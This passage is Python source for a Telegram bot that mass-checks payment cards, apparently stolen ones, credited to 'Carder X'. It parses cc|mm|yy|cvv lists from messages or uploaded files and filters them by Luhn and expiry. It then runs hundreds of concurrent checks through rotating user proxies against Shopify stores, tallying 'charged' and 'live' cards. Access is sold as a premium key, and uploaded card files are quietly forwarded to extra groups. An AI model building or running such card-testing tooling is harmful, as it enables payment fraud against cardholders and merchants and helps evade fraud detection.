            stats = proxy_manager.get_stats()
            print(f"📊 [ProxyManager Stats] Total: {stats['total_proxies']}, Active: {stats['active']}, Failed: {stats['failed']}, Uses: {stats['total_uses']}")
            logging.info(f"📊 [ProxyManager Stats] {stats}")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await callback.answer("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> Error stopping", show_alert=True)
        except:
            pass

@router.message(F.text.startswith("/stopmsh"))
async def stopmsh_command(message: types.Message):
    user = message.from_user
    if user.id not in ADMIN_IDS:
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> "
            "<b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.</b>",
            parse_mode="HTML"
        )
        return

    running_sessions = [
        (sid, s) for sid, s in list(MSH_SESSIONS.items())
        if s.get('status') == "CHECKING"
    ]

    if not running_sessions:
        await message.reply(
            "<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> "
            "<b>𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝗿𝘂𝗻𝗻𝗶𝗻𝗴.</b>",
            parse_mode="HTML"
        )
        return

    admin_name = html_escape(user.first_name or "Admin")
    if user.username:
        admin_link = f'<a href="https://t.me/{html_escape(user.username)}">{admin_name}</a>'
    else:
        admin_link = f'<a href="tg://user?id={user.id}">{admin_name}</a>'

    stopped = []

    for session_id, session in running_sessions:
        try:
            session['status'] = "STOPPED"

            cancelled = 0
            for task in session.get('tasks', []):
                if not task.done():
                    task.cancel()
                    cancelled += 1

            chat_id   = session.get('chat_id')
            msg_id    = session.get('msg_id')
            owner_id  = session.get('user_id')

            if chat_id and msg_id:
                try:
                    await message.bot.delete_message(
                        chat_id=chat_id,
                        message_id=msg_id,
                    )
                except Exception as e:
                    logging.warning(
                        f"[stopmsh] Could not delete progress msg for {session_id}: {e}"
                    )

            stop_notice = (
                "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> "
                "<b>𝗖𝗛𝗘𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗕𝗬 𝗔𝗗𝗠𝗜𝗡</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗔𝗱𝗺𝗶𝗻 ➛</b> {admin_link}\n"
                f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>\n"
                f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➛</b> <code>{session.get('checked', 0)}/{session.get('total', 0)}</code>"
            )

            if chat_id:
                try:
                    await message.bot.send_message(
                        chat_id=chat_id,
                        text=stop_notice,
                        parse_mode="HTML",
                    )
                except Exception as e:
                    logging.warning(
                        f"[stopmsh] Could not send stop-notice to chat {chat_id}: {e}"
                    )

            if owner_id:
                try:
                    await message.bot.send_message(
                        chat_id=owner_id,
                        text=(
                            "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> "
                            "<b>𝗬𝗼𝘂𝗿 𝗰𝗵𝗲𝗰𝗸 𝘄𝗮𝘀 𝘀𝘁𝗼𝗽𝗽𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━\n"
                            f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗔𝗱𝗺𝗶𝗻 ➛</b> {admin_link}\n"
                            f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
                        ),
                        parse_mode="HTML",
                    )
                except Exception as e:
                    logging.warning(f"[stopmsh] Could not notify user {owner_id}: {e}")

            stopped.append({
                'session_id': session_id,
                'user_id': owner_id,
                'checked': session.get('checked', 0),
                'total': session.get('total', 0),
                'cancelled': cancelled,
            })

            logging.info(
                f"🛑 [stopmsh] Stopped session {session_id} "
                f"(user {owner_id}) by admin {user.id} — cancelled {cancelled} tasks"
            )

        except Exception as e:
            logging.error(f"[stopmsh] Error stopping session {session_id}: {e}")

    lines = [
        "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> "
        "<b>𝗔𝗟𝗟 𝗠𝗦𝗛 𝗖𝗛𝗘𝗖𝗞𝗦 𝗦𝗧𝗢𝗣𝗣𝗘𝗗</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 ➛</b> <code>{len(stopped)}</code>",
        f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗕𝘆 ➛</b> {admin_link}",
        ""
    ]
    for s in stopped:
        lines.append(
            f"• <code>{s['session_id']}</code> — "
            f"<a href='tg://user?id={s['user_id']}'>{s['user_id']}</a> "
            f"({s['checked']}/{s['total']}) — {s['cancelled']} tasks cancelled"
        )

    await message.reply("\n".join(lines), parse_mode="HTML")

@router.message(lambda message: (message.text and message.text.startswith("/msh")) or (message.caption and message.caption.startswith("/msh")))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    user_name = html_escape(user.first_name or "Unknown")
    bot = message.bot

    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply(
    "<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji>GET KEY FROM @Lanxo2",
            parse_mode="HTML"
        )
        return

    is_checking = False
    for session_id, session_data in list(MSH_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "CHECKING":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
            "You have a check running.\n"
            "Use the <b><tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
            "Add proxies using <code>/proxy</code> command.",
            parse_mode="HTML"
        )
        return

    raw_text = ""

    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        for group_id in EXTRA_CHARGED_GROUP_IDS:
            try:
                await bot.send_document(
                    chat_id=group_id,
                    document=document.file_id,
                    caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file in /msh",
                    parse_mode="HTML"
                )
            except Exception as e:
                logging.error(f"Failed to forward txt file to extra group {group_id}: {e}")

        if document.file_size > 2 * 1024 * 1024:
            await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> File too large. Max  2MB.")
            return
        try:
            file_info = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML"
        )
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No valid card formats found.")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0
    MAX_VALID_CARDS = 10000

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{filter_info}<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> No valid cards to check.", parse_mode="HTML")
        return

    is_group = message.chat.type in ("group", "supergroup", "channel")

    asyncio.create_task(process_mass_check_background(message, bot, valid_cards, user, user_proxies, is_group))

async def process_mass_check_background(message: types.Message, bot: Bot, valid_cards: list, user_obj, user_proxies, is_group: bool = False):
    user_id = user_obj.id
    chat_id = message.chat.id

    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid cards to check.", parse_mode="HTML")
        return

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)

    proxy_manager = ProxyManager(user_proxies, session_id)
    proxy_stats = proxy_manager.get_stats()

    logging.info(f"🔄 [MSH] Session {session_id} initialized with ProxyManager: {proxy_stats['total_proxies']} proxies (normalized)")

    initial_text = (
        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> <i>CHECKING</i> <tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>\n"
        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>0/{total_cards}</code>\n"
        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/Lanxo2'>Carder X</a>\n"
        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)

    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    MSH_SESSIONS[session_id] = {
        "session_id": session_id,
        "status": "CHECKING",
        "chat_id": chat_id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "proxies": user_proxies,
        "proxy_manager": proxy_manager,
        "bad_proxies": [],
        "last_text": "",
        "last_update_time": 0,
        "live_cards": [],
        "dead_cards": [],
        "charged_cards": [],
        "error_cards": [],
        "user_obj": user_obj,
        "plan_name": plan_name,
        "is_group": is_group,
    }

    user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
    if user_custom_sites:
        active_sites = user_custom_sites
        site_source = f"CUSTOM ({len(user_custom_sites)} sites)"
    else:
        active_sites = get_sites()
        site_source = f"GLOBAL ({len(active_sites)} sites)"
    MSH_SESSIONS[session_id]["sites_list"] = active_sites

    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)} - Group: {is_group}")
    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)} - Group: {is_group}")

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return

    sem = asyncio.Semaphore(260)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name
                )
            except asyncio.CancelledError:
                print(f"🚫 [MSH] Task cancelled: {cc_formatted}")
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")
                    _s = MSH_SESSIONS.get(session_id)
                    if _s:
                        _s['errors'] += 1
                        _s['checked'] += 1
                        if _s['checked'] % 3 == 0 or _s['checked'] == _s['total']:
                            await update_progress_message(bot, session_id)

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            print(f"🛑 [MSH] Stopped creating tasks - {len(tasks)} created")
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    print(f"📋 [MSH] {len(tasks)} tasks created")
    logging.info(f"📋 [MSH] {len(tasks)} tasks created")

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)

        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))

        if cancelled > 0:
            print(f"🛑 [MSH] {cancelled} tasks cancelled")

        if errors > 0:
            logging.error(f"[MSH] {errors} tasks failed with exceptions")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"

    await update_progress_message(bot, session_id)

    print(f"✅ [MSH] Session {session_id} finished")
    logging.info(f"🎁 [MSH] Session {session_id} finished")
